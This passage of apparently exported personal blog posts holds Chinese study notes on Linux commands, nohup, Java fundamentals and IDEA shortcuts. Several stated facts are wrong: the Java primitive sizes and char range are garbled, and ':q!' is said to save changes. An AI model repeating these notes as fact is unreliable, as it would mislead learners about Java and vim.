class="line">mkdir -p /tmp/dir1/dir2       创建一个目录树</span><br><span class="line">mv dir1 new_dir               重命名/移动 一个目录</span><br><span class="line">cp file1 file2                复制一个文件</span><br><span class="line">cp dir/* .                    复制一个目录下的所有文件到当前工作目录</span><br><span class="line">cp -a /tmp/dir1 .             复制一个目录到当前工作目录</span><br><span class="line">cp -a dir1 dir2               复制一个目录</span><br><span class="line">ln -s file1 lnk1              创建一个指向文件或目录的软链接</span><br><span class="line">ln file1 lnk1                 创建一个指向文件或目录的物理链接</span><br><span class="line">touch -t 0712250000 file1     修改一个文件或目录的时间戳 </span><br></pre></td></tr></table></figure>

<h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *liuyazhuang*     查找当前目录下名称中含有&quot;liuyazhuang&quot;的文件</span><br><span class="line">find / -name *.conf            查找根目录下（整个硬盘）下后缀为.conf的文件</span><br><span class="line">find / -perm 777               查找所有权限是777的文件</span><br><span class="line">find / -type d                 返回根目录下所有的目录</span><br><span class="line">whereis halt 显示一个二进制文件、源码或man的位置</span><br><span class="line">which halt 显示一个二进制文件或可执行文件的完整路径</span><br></pre></td></tr></table></figure>

<h2 id="文件的权限-使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的权限  使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的权限  使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh                      显示权限</span><br><span class="line">ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</span><br><span class="line">chmod ugo+rwx directory1    设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限</span><br><span class="line">chmod go-rwx directory1     删除群组(g)与其他人(o)对目录的读写执行权限</span><br><span class="line">chown user1 file1           改变一个文件的所有人属性</span><br><span class="line">chown -R user1 directory1   改变一个目录的所有人属性并同时改变改目录下所有文件的属性</span><br><span class="line">chgrp group1 file1          改变文件的群组</span><br><span class="line">chown user1:group1 file1    改变一个文件的所有人和群组属性</span><br><span class="line">find / -perm -u+s           罗列一个系统中所有使用了SUID控制的文件</span><br><span class="line">chmod u+s /bin/file1        设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</span><br><span class="line">chmod u-s /bin/file1        禁用一个二进制文件的 SUID位</span><br><span class="line">chmod g+s /home/public      设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</span><br><span class="line">chmod g-s /home/public      禁用一个目录的 SGID 位</span><br><span class="line">chmod o+t /home/public      设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</span><br><span class="line">chmod o-t /home/public      禁用一个目录的 STIKY 位</span><br><span class="line">chmod +x                    文件路径 为所有者、所属组和其他用户添加执行的权限</span><br><span class="line">chmod -x                    文件路径 为所有者、所属组和其他用户删除执行的权限</span><br><span class="line">chmod u+x                   文件路径 为所有者添加执行的权限</span><br><span class="line">chmod g+x                   文件路径 为所属组添加执行的权限</span><br><span class="line">chmod o+x                   文件路径 为其他用户添加执行的权限</span><br><span class="line">chmod ug+x                  文件路径 为所有者、所属组添加执行的权限</span><br><span class="line">chmod =wx                   文件路径 为所有者、所属组和其他用户添加写、执行的权限，取消读权限</span><br><span class="line">chmod ug=wx                 文件路径 为所有者、所属组添加写、执行的权限，取消读权限</span><br></pre></td></tr></table></figure>

<h2 id="文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +a file1 只允许以追加方式读写文件</span><br><span class="line">chattr +c file1 允许这个文件能被内核自动压缩/解压</span><br><span class="line">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件</span><br><span class="line">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接</span><br><span class="line">chattr +s file1 允许一个文件被安全地删除</span><br><span class="line">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</span><br><span class="line">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件</span><br><span class="line">lsattr          显示特殊的属性</span><br></pre></td></tr></table></figure>

<h2 id="打包-and-压缩文件"><a href="#打包-and-压缩文件" class="headerlink" title="打包 and 压缩文件"></a>打包 and 压缩文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip   文件名.zip    压缩文件</span><br><span class="line">gzip  文件名        压缩文件</span><br><span class="line">gizp  –l 文件名.gz：显示压缩率</span><br><span class="line">unzip 文件名.zip    解压文件</span><br><span class="line">tar：归档文件</span><br><span class="line">tar -cvf out.tar liuyazhuang  打包一个归档（将文件&quot;liuyazhuang&quot;打包成一个归档）</span><br><span class="line">tar -xvf liuyazhuang.tar     释放一个归档（释放liuyazhuang.tar归档）</span><br><span class="line">tar -cvzf backup.tar.gz/etc  </span><br><span class="line">-z参数将归档后的归档文件进行gzip压缩以减少大小。</span><br><span class="line">-c：创建一个新tar文件</span><br><span class="line">-v：显示运行过程的信息</span><br><span class="line">-f：指定文件名</span><br><span class="line">-z：调用gzip压缩命令进行压缩</span><br><span class="line">-t：查看压缩文件的内容</span><br><span class="line">-x：解开tar文件</span><br><span class="line">tar  -cvf test.tar      *：将所有文件打包成test.tar扩展名.tar需自行加上</span><br><span class="line">tar  -zcvf test.tar.gz  *：将所有文件打包成test.tar再用gzip命令压缩</span><br><span class="line">tar -tf   test.tar ：   查看test.tar文件中包括了哪些文件</span><br><span class="line">tar -xvf test.tar       将test.tar解开</span><br><span class="line">tar -zxvf foo.tar.gz    解压缩</span><br></pre></td></tr></table></figure>

<h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 从第一个字节开始正向查看文件的内容</span><br><span class="line">tac file1 从最后一行开始反向查看一个文件的内容</span><br><span class="line">more file1 查看一个长文件的内容</span><br><span class="line">less file1 类似于 more 命令，但是它允许在文件中和正向操作一样的反向操作</span><br><span class="line">head -2 file1 查看一个文件的前两行</span><br><span class="line">tail -2 file1 查看一个文件的最后两行</span><br><span class="line">tail -f /var/log/messages 实时查看被添加到一个文件中的内容</span><br></pre></td></tr></table></figure>

<h2 id="列出目录内容"><a href="#列出目录内容" class="headerlink" title="列出目录内容"></a>列出目录内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -a：显示所有文件（包括隐藏文件）；</span><br><span class="line">ls -l：显示详细信息；</span><br><span class="line">ls -R：递归显示子目录结构；</span><br><span class="line">ls -ld：显示目录和链接信息；</span><br><span class="line">ctrl+r：历史记录中所搜命令（输入命令中的任意一个字符）；</span><br><span class="line">Linux中以.开头的文件是隐藏文件；</span><br><span class="line">pwd:显示当前目录</span><br></pre></td></tr></table></figure>

<h2 id="查看文件的类型"><a href="#查看文件的类型" class="headerlink" title="查看文件的类型"></a>查看文件的类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:查看文件的类型</span><br></pre></td></tr></table></figure>

<h1 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h1><p>grep：功能：在文件中搜索匹配的字符并进行输出</p>
<p>格式：grep[参数] &lt;要找的字串&gt; &lt;要寻找字 串的源文件&gt;<br>greplinux test.txt：搜索test.txt文件中字符串linux并输出</p>
<h1 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h1><p>功能：在文件和目录之间建立链接</p>
<p>格式：<code>ln [参数] &lt;源文件或目录&gt; &lt;目标文件或目录&gt;</code></p>
<p>链接分<code>软链接</code>和<code>硬链接</code></p>
<p>1.软链接<br>ln–s &#x2F;usr&#x2F;share&#x2F;do  doc ：创建一个链接文件doc并指向目录&#x2F;usr&#x2F;share&#x2F;do</p>
<p>2.硬链接<br>ln  &#x2F;usr&#x2F;share&#x2F;test  hard：创建一个硬链接文件hard，这时对于test文件对应 的存储区域来说，又多了一个文件指向它</p>
<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>vim拥有三种模式：命令模式、插入模式、ex模式</p>
<ul>
<li><p>命令模式（常规模式）<br>vim启动后，默认进入命令模式，任何模式都可以通过esc键回到命令模式（可以多按几次），命令模式下可以键入不同的命令完成选择、复制、粘贴、撤销等操作。<br>命名模式常用命令如下：<br>i : 在光标前插入文本；<br>o:在当前行的下面插入新行；<br>dd:删除整行；<br>yy：将当前行的内容放入缓冲区（复制当前行）<br>n+yy :将n行的内容放入缓冲区（复制n行）<br>p:将缓冲区中的文本放入光标后（粘贴）<br>u：撤销上一个操作<br>r:替换当前字符<br>&#x2F; 查找关键字</p>
</li>
<li><p>插入模式<br>在命令模式下按 “ i “键，即可进入插入模式，在插入模式可以输入编辑文本内容，使用esc键可以返回命令模式。</p>
</li>
<li><p>ex模式<br>在命令模式中按” : “键可以进入ex模式，光标会移动到底部，在这里可以保存修改或退出vim.<br>ext模式常用命令如下：<br>:w ：保存当前的修改<br>:q ：退出<br>:q! ：强制退出，保存修改<br>:x  :保存并退出，相当于:wq<br>:set number 显示行号<br>:! 系统命令  执行一个系统命令并显示结果<br>:sh ：切换到命令行，使用ctrl+d切换回vim</p>
</li>
</ul>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nohup命令</title>
    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
<span id="more"></span>

<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>

<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>

<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA知识点整理</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言学习笔记</p>
<span id="more"></span>

<h1 id="基础知识篇"><a href="#基础知识篇" class="headerlink" title="基础知识篇"></a>基础知识篇</h1><p>JAVA是一个强语言类型，<mark>切区分大小写！</mark></p>
<ul>
<li>public –&gt;表示公开的</li>
<li>static –&gt;表示静态的</li>
<li>void    –&gt;表示空</li>
<li>main    –&gt;主方法</li>
<li>class    –&gt;表示定义一个类</li>
</ul>
<p>简单程序示例</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sL8zdA.png"></p>
<ol>
<li>一个JAVA源文件可以定义多个class</li>
<li>一个JAVA源文件当中的public的class不是必须定义的<mark>public定义的class名字必须与类名一致，所有一个包中的一个公开的类只能有一个</mark></li>
<li>一个class会定义，或者产生一个xxx.class字节码文件（储存代码片段）</li>
</ol>
<p><img src="https://s3.ax1x.com/2021/01/25/sLGYw9.png"></p>
<p>命名法<br>类名，接口名：首字母大写，其余小写<br>变量名，方法名：首字母小写，其余大写<br>常量名：全部大写<br>要见名知意，遵守驼峰命名法<br>驼峰命名法：当命名要用2个及其以上单词时，用下划线或者首字母大写分开<br>写代码要符合规范，加空格的位置要注意加</p>
<ol>
<li>小容量转换成大容量，称为自动类型转换机制</li>
<li>long2&#x3D;123486453486L加L是说明是8字节<br>大容量转换成小容量加强制转换类型符，但是会损失精度 –&gt;int y &#x3D; (int) x</li>
</ol>
<p>注释<br>与C一样，但是如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 比较专业的注释方法，该注释信息会被javacloc.exe工具解析</span></span><br><span class="line"><span class="comment"> * 提取并生成帮助文档(即说明书)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>占用空间</p>
<ol>
<li>byte————  2 [-128~127]</li>
<li>short————4</li>
<li>int————8</li>
<li>long————4</li>
<li>float————4</li>
<li>doubie————8</li>
<li>boolean————1</li>
<li>char————2  [0~655302]</li>
</ol>
<p>三元运算符&#x2F;三目运算符&#x2F;条件运算符<br>语法规则<br>布尔表达式？表达式：表达式2</p>
<p>逻辑运算符要去两边都是布尔类型</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ol>
<li>方法体中不能在定义方法</li>
<li>方法体定义在类体中</li>
<li>规范；一个java文件只定义一个class</li>
<li>return后面不能放代码</li>
</ol>
<p>在JVM内存划分上有三块主要内存空间</p>
<ol>
<li>方法体内存</li>
<li>栈内存</li>
<li>堆内存</li>
</ol>
<p>1，方法片段属于class字节码文件的一部分，字节码文件在类加载的时候，将其存放在方法区中。所以JVM中的三块主要内存中方法区内存最先有数据。存放了代码片段。<br>2，代码片段虽然在方法区内存当中存有片段只有一份，但是可以被重复调用。每一次调用这个方法的时候，需要给该方法分配独立的活动场所，在栈内存中分配。<br>3，方法在调用的瞬间，会给该方法分配内存空间，会在栈中发生压栈动作，方法结束后給该方法分配内存空间收回，方法结束压栈。</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLJnne.png"></p>
<p>压栈：给该方法分配内存空间<br>弹栈：释放该方法内存空间<br>栈帧：永远指向栈顶元素<br>  栈顶元素处于活跃状态，其他元素静止<br>栈数据结构，存储数据结构特点<br>遵守：先进后出，后进先出</p>
<p>方法重载<br>功能相似，尽可能让方法名相同<br>只和方法名+参数列表有关系<br>方法名可以相同，但是其内的参数类型要不同</p>
<p>方法的递归调用<br>1，方法自身调用自身<br>2，递归必须有结束条件，没有结束条件一定会发生，栈内存溢出错误<br>3，即使有结束条件，也有可能发生栈内存溢出错误，因为递归太深了</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLNQAJ.png"></p>
<p>弹栈时逐级相加</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLYwrD.png"></p>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p><mark>优点：耦合度低，扩展力强。更容易解决现实世界中更复杂的业务逻辑</p>
<p>缺点：前期投入成本高，需要进行独立体的抽取，大量系统分析与设计</p>
<p>关注点是对象（独立体）能完成那些的功能</p>
<p>C语言纯面向过程，c++半面向对象，java纯面向对象</p>
<p>人在认识世界通常以面向对象的方式<br></mark></p>
<p>三大特征<br>—封装<br>—继承<br>—多态</p>
<p>采用面向对象的方式开发一个软件，生命周期当中<br>—面向对象的分析：OOA<br>—面向对象的设计：OOD<br>—面向对象的编程：OOP</p>
<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>类：类现在现实世界中是不存在的一个模板，是一个概念。是人类大脑抽象的结果<br>类代表了一类事物<br>在现实世界当中，对象A与对象B之间具有的共同特征，进行抽象总结出了一个模板。这个模板被称为类</p>
<p>对象：对象是实际存在的个体，现实世界当中实际存在。</p>
<p><mark>类–&gt;【实例化】–&gt;对象–&gt;【抽象】–&gt;类</mark></p>
<p><mark>注意<br>状态和动作特征当具体到某一个对象后，发现最终结果可能不一样。<br>对象和对象之间有共同的特征，但是具体到对象以后有数据差异</mark></p>
<p>类的定义<br>[修饰符列表]class 类名{<br>属性;<br>方法;<br>}<br>属性通常采用一个变量的形式来定义</p>
<p>JAVA语言中所有class都属于引用数据类型<br>类体 &#x3D; 属性 + 方法<br>实例变量：不能通过类直接访问<br>对象又被称为实例，实例变量又被称为对象变量（对象级别变量）<br>实例化对象的语法：new 类名（）<br>new运算符的作用是创建对象，在JVM堆内存当中开辟新内存空间<br>堆内存：new的对象在堆内存中的存储</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLtuFA.png"></p>
<p>在对象中分边定义两个引用，分边指向两个对象，则知其也知其二</p>
<p>局部变量：方法体中声明<br>成员变量：方法体外声明<br>实例变量：前边修饰符无static<br>静态变量：前边修饰符有sta</p>
<p>三块内存当中变化最频繁的是栈内存，最先有数据的是方法去内存，垃圾回收器主要针对的是堆内存。</p>
<p>垃圾回收器（自动回收垃圾机制，GC机制）<br>当堆内存中的Java对象称为垃圾数据时候，会被垃圾回收器回收。</p>
<p>堆内存中的java对象变成垃圾的条件<br>没有更多的引用指向它的时候<br>这个对象无法被访问，因为访问对象只能通过引用方式访问</p>
<p>静态变量存储在方法区内存当中<br>一个线程，一个栈内存<br>栈中主要存储方法体的局部变量</p>
<h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><ol>
<li><p>构造方法又被称为构造函数&#x2F;构造器</p>
</li>
<li><p>构造方法语句<br>[修饰符列表]构造方法名（形式参数列表）{<br>方法体；<br>}</p>
</li>
<li><p>对于构造方法来说，“返回类型不需要指定，并且也不能写void”，写上了就变成普通方法了</p>
</li>
<li><p>调用：new 构造方法名（实参列表）<br>构造方法的方法名与类名保持一致</p>
</li>
<li><p>构造方法有返回值，并且返回值类型是构造方法所在类的类型</p>
</li>
<li><p>当一个类中没有定义任何构造方法的话，系统默认给该类提供一个无参数的构造方法，这个构造方法被称为缺省构造器</p>
</li>
<li><p>构造方法支持重载机制</p>
</li>
<li><p>当一个类现实的构造方法定义了出来，那么系统不在为这个类提供缺省构造器。！！!开发时手动为当前类提供无参数构造方法。因为无参构造方法太常用了</p>
</li>
<li><p>实例变量没有手动赋值的时候系统默认赋值，类加载了代码片段，还没来的及创建对象。所有此时实例变量没有初始化</p>
</li>
</ol>
<h1 id="参数的传递"><a href="#参数的传递" class="headerlink" title="参数的传递"></a>参数的传递</h1><p>参数传递实际上传递的是变量中保持的具体值（字面值或者内存地址）</p>
<h1 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h1><ol>
<li>this是一个引用，this是一个变量，this变量中保存了内存地址指向了自身，this存储在JVM堆内存JAVA对象内部。</li>
<li>this代表当前正在执行这个行为的对象，当对象C1时，this是C1，当对象C2时this是C2</li>
<li>创建100个java对象，就有100this</li>
<li>this可以出现在实例方法当中，this指向当前正在执行这个动作的对象（this代表当前对象）</li>
<li><mark>this多数情况下都可以不写</mark></li>
<li>this不能再tsatic中使用</li>
</ol>
<p>在带siatic的方法中不能直接访问实例变量，实例方法。<br>因为实例变量和实例方法都需要变量的存在<br>而sitaic方法当中是没有this的。也就是说当前对象是不存在的<br>自然也是无法访问当前对象的实例变量和实例方法</p>
<p><mark>“类名.”可以省略</mark></p>
<ol>
<li><p>this.  –&gt;什么时候不能省略<br>用来区分局部变量和实例变量的时候，”this.”不能省略</p>
</li>
<li><p>this可以在那里使用<br>一，可以使用在实例方法当中，代表当前对象<br>二，可以使用在构造方法当中，通过当前的构造方法调用其他的构造方法【语法格式：this(实参)】</p>
</li>
</ol>
<p>在封装的地方”this.”再在构造函数处一模一样的”this.”——并不是无意义的，当你想修改对象的值的时候。</p>
<h1 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h1><p>什么时候成员变量声明为实例变量<br>所以对象都有这个属性，但这个属性的值会随着对象的变化而变化【不同对象的这个值不同】</p>
<p>什么时候成员变量声明为静态变量<br>所以对象都有这个属性，并且所有对象的这个属性的值是一样的，建议定义为静态变量，节省内存的开销。</p>
<p><mark>静态变量在类加载的时候初始化，内存在方法区中开辟。访问的时候不需要创建对象，直接使用”类名.静态变量名”的方式访问</mark></p>
<ol>
<li>可以使用static关键字来定义”静态代码块”：<br>语法规则：<br>static{<br>java语句;<br>}</li>
<li>静态代码块在类加载时执行，并且只执行一次</li>
<li>静态代码块在一个类中可以加载多个，并且遵循自上而下的顺序依次执行</li>
<li>静态代码块的作用是什么？怎么用？用在那儿？什么时候用？</li>
</ol>
<p>—这当然和具体的需要有关，例如项目中要求在类加载的时刻&#x2F;时机执行代码完成日志的记录，那么这段代码日志的代码就可以编写到静态代码块当中，完成日志。</p>
<p>—静态代码块是java为程序员准备的一个特殊时刻，这个特殊的时刻被称为类加载时刻。若希望在此刻执行一段特殊的程序，这段程序可以直接放到静态代码块当中</p>
<ol start="5">
<li>通常在静态代码块当中完成预备工作，先完成数据的准备工作，例如：初始化连接池，解析XML配置文件</li>
</ol>
<h1 id="实例语句块"><a href="#实例语句块" class="headerlink" title="实例语句块"></a>实例语句块</h1><p>实例语句块&#x2F;代码块</p>
<ol>
<li>实例代码块可以编写多个，也是遵循自上而下的顺序依次执行。</li>
<li>实例代码块在构造方法执行之前执行，构造方法一次执行，实例代码块对于执行一次。</li>
<li>实例代码块也是java语言为程序员准备一个特殊的时机，这个特殊时机被称为：对象初始化时机</li>
</ol>
<h1 id="方法的覆盖"><a href="#方法的覆盖" class="headerlink" title="方法的覆盖"></a>方法的覆盖</h1><ol>
<li>方法覆盖又叫方法的重写</li>
</ol>
<p>需要使用的情况<br>2. 当父类中的方法已经无法满足当前子类的需求，子类有必要将父类中继承过来的方法进行重新编写，这个重新编写的过程称为方法重写&#x2F;方法覆盖。</p>
<p>代码满足的时候发生代码重写<br>3. 一，方法重写发生在具有继承关系的父子类之间<br>二，返回值类型相同，方法名相同，形参列表相同</p>
<ol start="4">
<li><p>方法重新的时候用复制粘贴</p>
</li>
<li><p>访问权限不能低，可以更高</p>
</li>
<li><p>抛出的异常不能更多可以更少。</p>
</li>
<li><p>注意<br>私有方法不能继承，所以不能覆盖。<br>构造方法不能继承，所以不能覆盖。<br>静态方法不能继承，所以不能覆盖。<br>覆盖只针对方法，不谈属性。</p>
</li>
</ol>
<h1 id="java语言的三大特征"><a href="#java语言的三大特征" class="headerlink" title="java语言的三大特征"></a>java语言的三大特征</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装的好处：<br>1，封装之后，对于那个实物来说，看不到这个事物复杂的一面，只能看到事物简单的一面，复杂性封装，对外提供简单的操作入口<br>2，封装之后形成真正的对象，真正的独立体<br>3，封装意味着以后的程序可以重复使用。并且这个是我应该适应性比较强。在任何场合都可以使用<br>4封装以后，对于事物本身提高了安全级别</p>
<p>封装的步骤：<br>1，对所有属性私有化，使用private修饰词<br>2，对外提供简单访问入口<br>get–&gt;输出<br>Set–&gt;修改</p>
<p><mark>&#x2F;，settre 与 getter方法没有static关键字<br>有static关键字修饰的方法调用：类名，方法名（实参）<br>无static关键字修饰的方法调用：引用，方法名（实参）</mark></p>
<p>IDEA中直接一键封装</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>Java语言中的继承</p>
<ol>
<li>继承是面向对象三大特征之一</li>
<li>继承”基本”的作用是：代码复用。但是继承最”重要”的是：有了继承才有了以后，方法的覆盖和多态机制</li>
<li>java语言中继承只支持单继承，一个类不能同时继承很多类，只能继承一个类，在C++支持多继承</li>
<li>关于继承中的一些术语<br>B类继承A类，其中：<br>A类称为：父类，基类，超类，superclass<br>B类称为：子类，派生类，subclass</li>
<li>在java语言当中子类继承父类都继承那些数据呢？<br>—私有的不支持继承<br>—构造方法不支持继承<br>—其他数据都可以被继承</li>
<li>虽然java语言当中只支持单继承但是一个类也可以间接继承其他类，例如：<br>C extends b{<br>}<br>B extends  A{<br>}<br>A extends T{<br>}<br>C类间直继承B类，但是C类间接继承TA类</li>
<li>java语言中假设一个类没有显示的任何继承类，该类默认继承javaSE库当中提供的java.lang.Object类</li>
</ol>
<p>子类继承父类的所有属性和方法，但是不能直接访问private</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>java语言中的多态语法机制<br>1.ABC三个类之间的关系：<br>B类继承A类<br>C类继承A类<br>B，C之间没有任何继承关系</p>
<p>2.关于多态中涉及到的几个概念</p>
<p>向上转型（upcasting）                             B b2 &#x3D; new A<br>子类型 –&gt;父类型<br>又被称为：自动类型转换</p>
<p>向下转型（downcasting）<br>父类型–&gt;子类型<br>又被称为：强制类型转换【需要加强制类型转换符】</p>
<p><mark>无论是向上转型还是向下转型，两种类型之间必须要用继承关系。<br>没有继承关系，程序是无法编译通过的</mark></p>
<ol>
<li>Java程序永远都分为编译阶段和运行阶段</li>
<li>先分析编译阶段，在分析运行阶段，编译无法通过，根本是无法运行的A。class</li>
</ol>
<p>A a2 &#x3D; new B</p>
<p>静态绑定，编译过程中绑定，静态绑定之后才有后续运行</p>
<ol start="3">
<li>在程序运行阶段，JVM堆内存中真实绑定的是B对象，那么以下程序在运行阶段一定会调用B对象的方法，此时发生了动态绑定，运行阶段绑定。</li>
</ol>
<p><mark>底层是什么对象就调对象的什么方法</mark></p>
<ol start="4">
<li>父类型引用指向子类型对象这种机制导致程序存在编译阶段绑定和运行阶段绑定两种不同的形态&#x2F;状态，这种机制可以成为一种多态语法机制</li>
</ol>
<p>需要向下转型的时候<br><mark>当调用的方法是子类型中特有的，在父类型当中不存在，必须向下转型</mark></p>
<p>用强制转换类型，向下转型，程序虽然通过了，但是程序在运行阶段会出现异常，因为JVM堆内存当中真实存在的对象是Bird类型，Bird对象无法转换成Cat对象，因为两种类型之间不存在任何继承关系，此时出现了著名的异常：</p>
<ul>
<li><pre><code>  java.lang.classcastexception
</code></pre>
</li>
<li>类型转换异常，这种异常总是在”向下转型”的时候会发生<blockquote>
<p>次异常只会出现在”向下转型”，说明”向下转型”存在隐患（编译过了，但是存在运行错误）</p>
</blockquote>
</li>
</ul>
<p>1，向上转型只有编译过了，运行一定不会出问题<br>2，向下转型编译过了，运行可能存在错误</p>
<p>避免向下转型出现的异常</p>
<p>使用instanceof运算符可以避免次异常</p>
<p>instanceof语法格式：引用 instanceof 数据类型名<br>以上运算符的执行结果是布尔类型，结果可能是true&#x2F;false</p>
<p>关于运算结果true&#x2F;false<br>假设：（a instanceof Animal）<br>true表示<br>a这个引用指向的一个对象是一个Animal类型<br>false表示<br>a这个引用指向的一个对象不是一个Animal类型</p>
<p>在使用强制类型转换符之前，使用instanceof运算符进行判断，避免classcastexception异常发生</p>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA快捷生成代码</title>
    <url>/JAVA/IDEA%E5%BF%AB%E6%8D%B7%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备吧JAVA作为主要使用语言写POC，所有记一下</p>
<span id="more"></span>

<h1 id="psvm"><a href="#psvm" class="headerlink" title="psvm"></a>psvm</h1><pre><code>//生成main方法:
public static void main(String[] args) &#123;&#125;
</code></pre>
<h1 id="sout"><a href="#sout" class="headerlink" title="sout"></a>sout</h1><pre><code>//生成打印输出:
System.out.println();
</code></pre>
<h1 id="“abc”-sout"><a href="#“abc”-sout" class="headerlink" title="“abc”.sout"></a>“abc”.sout</h1><pre><code>//生成打印字符串:
System.out.println(&quot;adc&quot;);
</code></pre>
<h1 id="“abc”-format"><a href="#“abc”-format" class="headerlink" title="“abc”.format"></a>“abc”.format</h1><pre><code>//生成字符串格式化:
